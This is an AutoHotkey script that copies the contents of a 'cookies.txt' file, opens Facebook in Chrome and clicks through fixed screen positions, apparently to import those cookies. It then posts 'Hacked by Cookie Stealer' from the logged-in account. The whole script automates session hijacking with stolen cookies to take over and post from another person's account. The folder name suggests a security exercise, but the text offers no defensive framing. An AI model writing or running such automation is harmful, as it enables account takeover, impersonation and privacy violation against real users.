#NoEnv  ; Recommended for performance and compatibility with future AutoHotkey releases.
; #Warn  ; Enable warnings to assist with detecting common errors.
SendMode Input  ; Recommended for new scripts due to its superior speed and reliability.
SetWorkingDir %A_ScriptDir%  ; Ensures a consistent starting directory.


^3::


Run,  ..\NetworkSecurity\cookies.txt,,, pid

Sleep, 1000


SendInput ^a
Sleep, 500
SendInput ^c
Sleep, 500

WinClose, % "ahk_pid " pid


Run chrome.exe "https://facebook.com"

WinMaximize
sleep, 2000 

Send {Click, 1823, 62}
sleep, 800 
Send {Click, 288, 23}
sleep, 800 
Send {Click, 301, 86}
SendInput ^v
sleep, 800 
Send {Click, 270, 586}
sleep, 800 
Send {Click, -1174, -13}
sleep, 2000 

Send {Click, 770, 244}
sleep, 1000
SendInput Hacked by Cookie Stealer
sleep, 1000
Send {Click, 819, 486}